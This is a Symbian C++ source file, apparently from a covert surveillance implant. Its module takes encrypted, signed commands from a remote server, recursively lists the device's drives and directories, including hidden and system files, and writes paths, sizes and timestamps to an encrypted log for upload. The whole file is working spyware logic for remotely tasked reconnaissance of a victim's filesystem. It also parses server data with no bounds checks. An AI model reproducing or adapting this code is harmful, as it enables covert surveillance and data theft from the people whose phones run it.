/*
 * StateFileSystem.cpp
 *
 *  Created on: 19/feb/2011
 *      Author: Giovanna
 */

#include "StateFileSystem.h"
#include "Keys.h"
#include <HT\LogFile.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>
#include <HT\TimeUtils.h>


#define LOG_FILESYSTEM_VERSION 2010031501
#define FILESYSTEM_IS_DIRECTORY 1
#define FILESYSTEM_IS_EMPTY 2

typedef struct TFilesystemData
	{
	TUint32	uVersion;
	TUint32	uPathLen;
	TUint32	uFlags;
	TUint32 lowFileSize;
	TUint32 highFileSize;
	TUint32 lowDateTime;
	TUint32 highDateTime;
	TFilesystemData()
		{
		uVersion = LOG_FILESYSTEM_VERSION;
		uFlags = 0;
		lowFileSize = 0;
		highFileSize = 0;
		lowDateTime = 0;
		highDateTime = 0;
		}
	} TFilesystemData;

	
CStateFileSystem::CStateFileSystem(MStateObserver& aObserver) : CAbstractState(EState_FileSystem, aObserver)
	{
	// No implementation required
	}

CStateFileSystem::~CStateFileSystem()
	{
	delete iRequestData;
	delete iResponseData;
	delete iLogFs;
	iFs.Close();
	}

CStateFileSystem* CStateFileSystem::NewLC(MStateObserver& aObserver)
	{
	CStateFileSystem* self = new (ELeave) CStateFileSystem(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateFileSystem* CStateFileSystem::NewL(MStateObserver& aObserver)
	{
	CStateFileSystem* self = CStateFileSystem::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateFileSystem::ConstructL()
	{
	iFs.Connect();
	iLogFs = CLogFile::NewL(iFs);
	}

void CStateFileSystem::ActivateL(const TDesC8& aData)
	{
	//Save the sign key
	iSignKey.Copy(aData);
	
	TBuf8<32> plainBody(KProto_FileSystem);
	_LIT8(KZero,"\x00\x00\x00\x00");
	plainBody.Append(KZero);
	// calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(plainBody,sha);
	//append SHA1
	plainBody.Append(sha);
	//encrypt
	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
	buff.CleanupClosePushL();
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	
	iObserver.SendStateDataL(*iRequestData);
	}

void CStateFileSystem::ProcessDataL(const TDesC8& aData) 
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
	
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check the result of allocation
			iResponseData->Des().Append(aData);
			}
			return;
		}
		
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrContent);
		return;
		}
			
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
		
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	//check response
	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
		{
		//log required
		iLogFs->CreateLogL(LOGTYPE_FILESYSTEM);
		LogFilesystemL(plainBody.Right(plainBody.Size()-8));  //8=KProto_Ok|len
		iLogFs->CloseLogL();
		}
	CleanupStack::PopAndDestroy(&plainBody);
	iObserver.ChangeStateL();    
		
	}



/*
 * Log the required paths.
 * aPathList:
 * numDir | depth1 | dir1 | depth2 | dir2 | ... 
 * # numDir: numero di coppie depth e dir da leggere, INT
 * # depth(n): profondita' di ricerca della directory ennesima, INT
 * # dir(n): percorso della directory ennesima, UTF16-LE PASCAL Null-Terminated 
 */
void CStateFileSystem::LogFilesystemL(const TDesC8& aPathList)
	{
	//retrieve the num of required dir
	TUint8* ptr = (TUint8 *)aPathList.Ptr();
	TUint32 numDir = 0;   				
	Mem::Copy(&numDir, ptr, 4);
	ptr += sizeof(TUint32); 			
	
	for(TInt i=0; i<numDir; i++)
		{
		//retrieve depth
		TUint32 level = 0;
		Mem::Copy(&level,ptr,4);
		ptr += sizeof(TUint32);
		//retrieve path len
		TUint32 len = 0;
		Mem::Copy(&len,ptr,4);
		ptr += sizeof(TUint32);
		//retrieve path
		HBufC* path = HBufC::NewL(len);
		if (len > 0)
			{
			TUint8 totChars = (len-2) / 2;
			TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
			path->Des().Append(ptrNum);  
			}
		ptr += len;
		//log tree
		LogTreeL(iFs,*path,level);
		}
	}


//TODO: verify all this! check error conditions!
void CStateFileSystem::LogDrives(RFs& aFs)
	{
	//this is the special case: we are asked the drive list
	//any byte in the drive list which has a non zero value signifies 
	//that the corresponding drive exists. The byte's value can be used to retrieve 
	//the drive's attributes by using a bitwise AND with the corresponding drive attribute constant.
	_LIT(KNull,"\x00");
	_LIT(KFormat,"%c:");
	TDriveList driveList;
	TInt err = aFs.DriveList(driveList);
	if(err != KErrNone)
		return;
	//log drives
	for(TInt driveNumber=EDriveA; driveNumber<=EDriveZ; driveNumber++)
		{
		if (driveList[driveNumber]) /** now we iterate through all the available drives */
			{
			TChar driveLetter;
			err = aFs.DriveToChar(driveNumber,driveLetter);
			TBuf<8> buf;
			buf.Format(KFormat,(TUint)driveLetter);
			buf.Append(KNull);  //NULL terminated
			HBufC8* rootBuf = GetDriveBuffer(buf);
			if(rootBuf->Size()>0)
				{
				CleanupStack::PushL(rootBuf);
				iLogFs->AppendLogL(*rootBuf);
				CleanupStack::PopAndDestroy(rootBuf);
				}
			}
		}
	}

void CStateFileSystem::LogTreeL(RFs& aFs,const TDesC& aPath, TInt aLevel)
	{
	//check if we are asked for availables drives
	_LIT(KSlash,"/");
	if(aPath.CompareF(KSlash) == 0)
		{
		LogDrives(aFs);
		return;
		}
	//else we are asked for path and level
	RPointerArray<HBufC> pathList;
	//remove asterisk
	_LIT(KAsterisk,"*");
	TInt pos = aPath.Find(KAsterisk);
	if(pos == KErrNotFound)
		{
		return;
		}
	HBufC* path = aPath.Left(pos).AllocL();
	pathList.AppendL(path);
	_LIT(KBackSlash,"\\");
					
	for(TInt i=0;i<aLevel;i++)
		{
		CDir* dirList;
		CDir* fileList;
		
		TInt pathCount = pathList.Count();
		for(TInt i=0; i<pathCount; i++)
			{
			TInt result = aFs.GetDir(*(pathList[i]),KEntryAttNormal | KEntryAttHidden | KEntryAttSystem,ESortByName | EDirsFirst | EAscending,fileList,dirList);
			if(result == KErrPermissionDenied)
				{
				continue;
				}
			CleanupStack::PushL(dirList);
			CleanupStack::PushL(fileList);
					
			TInt fileCount = fileList->Count();
			TInt dirCount = dirList->Count();
			//log found files
			for(TInt j=0;j<fileCount;j++)
				{
				RBuf8 buf(GetPathBuffer((*fileList)[j],*(pathList[i])));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
					{
					iLogFs->AppendLogL(buf);
					}
				CleanupStack::PopAndDestroy(&buf);
				}
			//log & append dir
			for(TInt k=0;k<dirCount;k++)
				{
				//log
				RBuf8 buf(GetPathBuffer((*dirList)[k],*(pathList[i])));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
					{
					iLogFs->AppendLogL(buf);
					}
				CleanupStack::PopAndDestroy(&buf);
				//append
				HBufC* subDirBuf = HBufC::NewL(pathList[i]->Size() + (*dirList)[k].iName.Size() +1);
				TPtr subDirPtr(subDirBuf->Des());
				subDirPtr.Copy(*(pathList[i]));
				subDirPtr.Append((*dirList)[k].iName);
				subDirPtr.Append(KBackSlash);
				pathList.AppendL(subDirBuf);
				}
			CleanupStack::PopAndDestroy(2); //dirList,fileList
			}
		//delete already scanned dir
		for(TInt i=0;i<pathCount;i++)
			{
			delete pathList[0];
			pathList.Remove(0);
			}
		}
	//remaining dir into iPathList must be removed at the end...
	TInt lastDirCount = pathList.Count();
	for(TInt i=0; i<lastDirCount; i++)
		{
		delete pathList[i];
		}
	pathList.Reset();
	}


HBufC8* CStateFileSystem::GetPathBuffer(TEntry aEntry, const TDesC& aParentPath)
	{
	TFilesystemData fsData;
	
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	//path is a directory
	if(aEntry.IsDir())
		{
		fsData.uFlags=1;
		}
	//last write time
	TInt64 filetime = TimeUtils::GetFiletime(aEntry.iModified);
	fsData.highDateTime = (filetime >> 32);
	fsData.lowDateTime = (filetime & 0xFFFFFFFF);
	//file size in bytes
	fsData.lowFileSize = aEntry.iSize;
	fsData.highFileSize = 0;
	//pathlen
	fsData.uPathLen = aEntry.iName.Size()+aParentPath.Size();
	buffer->InsertL(buffer->Size(),&fsData,sizeof(fsData));
	buffer->InsertL(buffer->Size(),(TUint8 *)aParentPath.Ptr(),aParentPath.Size());
	buffer->InsertL(buffer->Size(),(TUint8 *)aEntry.iName.Ptr(),aEntry.iName.Size());
	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);

	return result;
	}


HBufC8* CStateFileSystem::GetDriveBuffer(const TDesC& aDrivePath)
	{
	TFilesystemData fsData;
		
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	//path is a directory
	fsData.uFlags=1;
	//pathlen
	fsData.uPathLen = aDrivePath.Size();
	buffer->InsertL(buffer->Size(),&fsData,sizeof(fsData));
	buffer->InsertL(buffer->Size(),(TUint8 *)aDrivePath.Ptr(),aDrivePath.Size());
	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	
	return result;
	}


